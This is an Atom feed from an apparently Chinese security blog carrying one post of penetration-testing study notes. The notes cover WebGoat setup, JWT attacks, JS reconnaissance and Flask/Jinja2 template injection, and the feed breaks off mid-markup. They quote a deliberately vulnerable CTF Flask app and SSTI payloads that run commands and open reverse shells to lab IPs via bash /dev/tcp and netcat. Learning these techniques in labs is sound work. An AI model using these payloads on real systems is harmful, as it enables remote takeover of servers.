<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://www.n1h1l157.live</id>
    <title>X_T • Posts by &#34;渗透测试&#34; tag</title>
    <link href="http://www.n1h1l157.live" />
    <updated>2022-12-29T16:00:00.000Z</updated>
    <category term="ENFJ" />
    <category term="ENFP" />
    <category term="ENTP" />
    <category term="ENTJ" />
    <category term="ESFJ" />
    <category term="ESFP" />
    <category term="ESTJ" />
    <category term="ESTP" />
    <category term="INFJ" />
    <category term="INTJ" />
    <category term="INFP" />
    <category term="INTP" />
    <category term="ISFJ" />
    <category term="ISFP" />
    <category term="ISTJ" />
    <category term="ISTP" />
    <category term="MBTI" />
    <category term="心理测试" />
    <category term="渗透测试" />
    <category term="灵性" />
    <category term="Linux" />
    <category term="记忆" />
    <category term="Trojan" />
    <category term="VULNHUB 1-10" />
    <category term="信息安全网址" />
    <category term="VULNHUB 11-20" />
    <category term="VULNHUB 21-30" />
    <category term="VULNHUB 31-40" />
    <category term="VULNHUB 41-50" />
    <category term="人生" />
    <category term="成长" />
    <category term="神学" />
    <category term="人生哲学" />
    <category term="历史" />
    <category term="社会" />
    <category term="生命" />
    <category term="命运" />
    <category term="爱情" />
    <category term="意义" />
    <category term="人性" />
    <category term="道德" />
    <entry>
        <id>http://www.n1h1l157.live/2022/12/30/SAFE/1%20WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</id>
        <title>XD22 1 Web 基础知识</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2022/12/30/SAFE/1%20WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
        <content type="html">&lt;h3 id=&#34;javaweb&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#javaweb&#34;&gt;#&lt;/a&gt; JavaWeb&lt;/h3&gt;
&lt;h4 id=&#34;部署-webgoat&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#部署-webgoat&#34;&gt;#&lt;/a&gt; 部署 webgoat&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;环境下载并 webgoat 启用环境&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;webgoat 下载地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/WebGoat/WebGoat&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/usr/libexec/java_home -v 19 --exec java -jar webgoat-server-8.2.2.jar --server.address=192.168.0.102 --server.port=9091&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;打开url并注册新用户&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1:9091/WebGoat/login&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.0.102:9091/WebGoat/start.mvc#lesson/PathTraversal.lesson/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;注意如果是本地回环地址无法抓取到数据包，需要切换成本地 ip 地址&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;jar-文件反编译&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#jar-文件反编译&#34;&gt;#&lt;/a&gt; jar 文件反编译&lt;/h4&gt;
&lt;p&gt;拿到 jar 文件，先用 unzip 进行解压，用 IDEA 工具将其打开；&lt;br&gt;
对照数据包，定位 url 如 / WebGoat/PathTraversal/profile-upload-remove-user-input；&lt;br&gt;
在 java 源码中定位到 PathTraversal 的库文件，并右键加载为库后可查到源代码；&lt;br&gt;
在 PathTraversal 中查看 ProfileUploadRemoveUserInput 方法看起功能，对照 html 界面查看传参规则及限制进行绕过。&lt;/p&gt;
&lt;h4 id=&#34;jwt-使用及攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#jwt-使用及攻击&#34;&gt;#&lt;/a&gt; jwt 使用及攻击&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;jwt 说明&lt;br&gt;
 jwt 是用来判断当前的用户是游客、注册用户还是管理员的，写在 cookie 部分，由三部分组成，分别为 header 加密算法、payload 内容，signature 签名组成，中间由小数点隔开，可在 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9qd3QuaW8=&#34;&gt;https://jwt.io&lt;/span&gt; 上看这个 jwt 的具体内容是什么。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;jwt 例子&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE2NjU0NTczMzIsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.CsmBkpcCp8WXKrbN4QZ-qDRUA0n1O-f0YUwIFHyVVvZyuUNay3zlTrkQrd-oVyG5YMUMDckXvsXRbjZS378Vcw&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;详细可参考&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://www.cnblogs.com/vege/p/14468030.html&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;jwt 攻击&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;（1）签名没验证空加密&lt;br&gt;
可寻找相关脚本尝试空加密，但是这种概率非常小；&lt;/p&gt;
&lt;p&gt;（2）爆破密匙:&lt;br&gt;
 如果能够获取到源码拿到加密算法中的加密密匙，可以寻找相关脚本进行破解密钥，由密匙和高级管理用户重新生成 jwt 来跳过身份验证；&lt;br&gt;
jwt 密钥爆破工具链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JyZW5kYW4tcml1cy9jLWp3dC1jcmFja2Vy&#34;&gt;https://github.com/brendan-rius/c-jwt-cracker&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;（3）KID 利用:&lt;br&gt;
kid 参数用于读取密钥文件，但系统并不会知道用户想要读取的到底是不是密钥文件，所以，如果在没有对参数进行过滤的前提下，攻击者可以读取到系统的任意文件的&lt;/p&gt;
&lt;h4 id=&#34;javaweb-其他漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#javaweb-其他漏洞&#34;&gt;#&lt;/a&gt; javaweb 其他漏洞&lt;/h4&gt;
&lt;p&gt;（1）目录遍历：有的目录做了限制只能解析 jpg/png 文件，但是在上传文件时跳过了这个限制，将文件上传到了其他目录，而其他目录也有可能是可以解析脚本语言的。&lt;/p&gt;
&lt;p&gt;（2）认证绕过：将用户上传的数据与数据库比对，如果用户上传的两个键值在数据库中不存在即 a=null&amp;amp;b=null，则可以伪造两个数据库不存在的 key 值进行认证绕过。&lt;/p&gt;
&lt;p&gt;（3）组件漏洞：java 的组件有很多，如 log 4 j、xstream 等 jar 包存在安全漏洞的话，则可以通过寻找相关漏洞版本的 poc 尝试漏洞利用。&lt;/p&gt;
&lt;p&gt;（4）其他中高危：不安全的反序列化、XML 外部实体、访问控制（隐藏属性、越权）。&lt;/p&gt;
&lt;h3 id=&#34;javascript&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#javascript&#34;&gt;#&lt;/a&gt; javaScript&lt;/h3&gt;
&lt;h4 id=&#34;js渗透知识&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#js渗透知识&#34;&gt;#&lt;/a&gt; js 渗透知识&lt;/h4&gt;
&lt;p&gt;（1）什么是 js 渗透&lt;br&gt;
在 Javascript 中也存在变量和函数，当存在可控变量及函数调用即可参数漏 洞 JS 开发的 WEB 应用和 PHP，JAVA,NET 等区别在于即没有源代码，也可以通过浏览器的查看源代码获取真实的点。所以相当于 JS 开发的 WEB 应用属于 白盒测试 (默认有源码参考)。&lt;/p&gt;
&lt;p&gt;（2）如何判定 JS 开发应用&lt;br&gt;
插件 wappalyzer、源代码简短、引入多个 js 文件、一般有 /static/js/app.js 等顺序的 js 文件、cookie 中有 connect.sid。&lt;/p&gt;
&lt;p&gt;（3）如何利用 js 代码&lt;br&gt;
寻找接口，手机号码登录，验证码接收等文件，验证对方逻辑、或逻辑考 虑不全面的地方；如根据返回的验证码是 200 判断验证码有效，则可以测试修改返回包中的验证码返回值是否能绕过，如有一个重置手机号密码的 url 地址，可以直接访问测试是否有认证限制；也可以寻找框架漏洞测试如 node.js/vue.js， 框架漏洞较少。&lt;/p&gt;
&lt;h4 id=&#34;js文件获取&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#js文件获取&#34;&gt;#&lt;/a&gt; js 文件获取&lt;/h4&gt;
&lt;p&gt;（1）如何获取更多的 JS 文件？&lt;br&gt;
JsFinder、Packer-Fuzzer、扫描器后缀替换字典&lt;/p&gt;
&lt;p&gt;（2）如何快速获取价值代码？&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;快速获取有价值的js代码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;method:&amp;quot;get&amp;quot;、http.get(&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;method:&amp;quot;post&amp;quot;、http.post(&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;.ajax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;service.httppost、service.httpget&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（3）js 安全漏洞&lt;br&gt;
前端验证修改返回数据包、URL 地址泄漏、未授权访问、框架漏洞&lt;/p&gt;
&lt;h3 id=&#34;python&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#python&#34;&gt;#&lt;/a&gt; python&lt;/h3&gt;
&lt;h4 id=&#34;pyc-文件反编译&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pyc-文件反编译&#34;&gt;#&lt;/a&gt; pyc 文件反编译&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;PY 反编译 PYC 编译文件反编译源码&lt;br&gt;
 pyc 文件是 py 文件编译后生成的字节码文件 (byte code)，pyc 文件经过 python 解释器最终会生成机器码运行。因此 pyc 文件是可以跨平台部署的，类似 Java 的.class 文件，一般 py 文件改变后，都会重新生成 pyc 文件。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;pyc反编译平台：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://tool.lu/pyc/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;pyc反编译工具：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/wibiti/uncompyle&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/rocky/python-uncompyle&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;ssti模板注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssti模板注入&#34;&gt;#&lt;/a&gt; SSTI 模板注入&lt;/h4&gt;
&lt;p&gt;（1）什么是 SSTI? 有什么漏洞危害？&lt;br&gt;
 漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作 为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执 行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执 行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。&lt;/p&gt;
&lt;p&gt;（2）如何判断检测 SSTI 漏洞的存在？&lt;br&gt;
 输入的数据会被浏览器利用当前脚本语言调用解析执行&lt;/p&gt;
&lt;p&gt;（3）SSTI 安全问题在生产环境那里产生？存在模版引用的地方，&lt;br&gt;
如 404 错误页面展示&lt;br&gt;
存在数据接收引用的地方，如模版解析获取参数数据&lt;br&gt;
一般需要获取到源码之后再去分析漏洞产生的地方，黑盒测试比较难发现&lt;/p&gt;
&lt;h4 id=&#34;ssti利用代码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssti利用代码&#34;&gt;#&lt;/a&gt; SSTI 利用代码&lt;/h4&gt;
&lt;p&gt;漏洞详情：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hvdXlhbmh1YTEvYXJ0aWNsZS9kZXRhaWxzLw==&#34;&gt;https://blog.csdn.net/houyanhua1/article/details/&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用代码分析&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import flask&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;app = flask.Flask(__name__)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;app.config[&amp;#x27;FLAG&amp;#x27;] = os.environ.pop(&amp;#x27;FLAG&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@app.route(&amp;#x27;/&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def index():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  return open(__file__).read()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@app.route(&amp;#x27;/shrine/&amp;lt;path:shrine&amp;gt;&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def shrine(shrine):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  def safe_jinja(s):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s = s.replace(&amp;#x27;(&amp;#x27;, &amp;#x27;&amp;#x27;).replace(&amp;#x27;)&amp;#x27;, &amp;#x27;&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    blacklist = [&amp;#x27;config&amp;#x27;, &amp;#x27;self&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return &amp;#x27;&amp;#x27;.join([&amp;#x27;&amp;#123;&amp;#123;% set &amp;#123;&amp;#125;=None%&amp;#125;&amp;#125;&amp;#x27;.format(c) for c in blacklist]) + s #&amp;#x27;&amp;#123;% set config=None%&amp;#125;&amp;#123;% set self=None%&amp;#125;&amp;#x27;+s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  return flask.render_template_string(safe_jinja(shrine))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if __name__ == &amp;#x27;__main__&amp;#x27;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  app.run(debug=True)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;url_for () 函数是用于构建操作指定函数的 URL, url_fo 会返回视图函数对应的 URL。如果定义的视图函数是带有参数的，则可以将这些参数作为命名参数传入&lt;br&gt;
 &lt;code&gt;/shrine/&amp;#123;&amp;#123;url_for.__globals__&amp;#125;&amp;#125;&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;/shrine/&amp;#123;&amp;#123;url_for.__globals__[&#39;current_app&#39;].config&amp;#125;&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;get_flashed_messages () 函数是获取传递过来的数据，返回之前在 Flask 中通过 flash () 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages () 方法取出 (闪现信息只能取出一次，取出后闪现信息会被清空)。&lt;br&gt;
 &lt;code&gt;/shrine/&amp;#123;&amp;#123;get_flashed_messages.__globals__&amp;#125;&amp;#125;&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;/shrine/&amp;#123;&amp;#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&amp;#125;&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;ssti-反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssti-反弹shell&#34;&gt;#&lt;/a&gt; SSTI 反弹 shell&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;常用来确定是否存在SSTI漏洞的payload：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.31.60:9999/?name=&amp;#123;&amp;#123;2*2&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;py一句话引入os调用系统命令执行&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.31.60:9999/?name=&amp;#123;%%20import%20os%20%&amp;#125;&amp;#123;&amp;#123;os.system(%27id% 27)&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;py一句话引入os.popen的方式调用系统命令：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.31.17:5000/sh4d0w\$s?l333tt=&amp;#123;&amp;#123;%20config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20-la%27).read()%20&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;py通过os.system调用bash反弹shell：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.31.60:9999/?name= &amp;#123;% import os %&amp;#125;&amp;#123;&amp;#123;os.system(&amp;#x27;bash -c &amp;quot;bash -i &amp;gt;&amp;amp;/dev/tcp/192.168.31.135/4446 &amp;gt;&amp;amp;1&amp;quot;&amp;#x27;)&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;py通过os.popen的方式调用nc反弹shell：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.31.17:5000/sh4d0w\$s?&amp;#123;&amp;#123;%20config.__class__.__init__.__globals__[%27os%7].popen(%27nc%20192.168.31.99%204444%20-e%20/bin/bash%27).read()%20&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;py反弹shell失败时可尝试用urlencode编码绕过：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://www.jsons.cn/urlencode&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.31.11:9999/?name=%7B%25%20import%20os%20%25%7D%7B%7Bos.system(%27bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.31.135%2F4444%200%3E%261%2%27)%7D%7D&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta 